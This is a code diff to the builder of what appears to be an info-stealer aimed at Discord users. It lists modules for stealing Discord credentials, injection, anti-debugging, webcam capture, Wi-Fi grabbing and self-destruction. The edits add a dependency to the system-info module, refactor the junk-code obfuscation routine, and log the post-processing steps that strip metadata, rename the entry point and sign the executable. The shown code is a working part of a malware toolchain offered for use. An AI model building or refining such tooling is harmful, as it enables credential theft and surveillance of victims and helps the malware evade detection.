@@ -619,7 +619,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "antidebug_vm": ["psutil"],
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
-                "systeminfo": ["psutil"]
+                "systeminfo": ["psutil", "pycountry"]
             }
             
             included_modules_pyinstaller = [
@@ -638,7 +638,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "base64", "re"],
                 "fakeerror": ["ctypes"],
                 "injection": ["subprocess", "psutil", "re"],
-                "systeminfo": ["psutil", "subprocess"],
+                "systeminfo": ["psutil", "subprocess", "pycountry"],
                 "self_destruct": ["subprocess"],
                 "wifi": ["subprocess"],
                 "webcam": ["cv2"],
@@ -732,10 +732,12 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 continue
 
     def write_and_obfuscate(self, filename):
+        def generate_name():
+            return '_%s' % ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 20)))
+        
         def _junk(path: str) -> None:
             with open(path) as file:
                 code = file.read()
-            generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
             junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
             junk_func_calls = junk_funcs.copy()
             
@@ -825,6 +827,7 @@ class %s:
             
     def PostProcessing(self, filename: str) -> None:
         logging.info("Removing MetaData")
+        print("Removing MetaData")
         with open(filename, "rb") as file:
             data = file.read()
         
@@ -842,6 +845,7 @@ class %s:
         
         # Renaming Entry Point
         logging.info("Renaming Entry Point")
+        print("Renaming Entry Point")
         with open(filename, "rb") as file:
             data = file.read()
     
@@ -855,6 +859,7 @@ class %s:
 
         # Adding Certificate
         logging.info("Adding Certificate")
+        print("Adding Certificate")
         certFile = "cert"
         if os.path.isfile(certFile):
             signfile(filename, certFile, filename)
@@ -868,10 +873,6 @@ class %s:
         self.build.configure(state=state)
         self.checkwebhook_button.configure(state=state)
         self.webhook_button.configure(state=state)
-        
-
-
-
 
 
 if __name__ == "__main__":
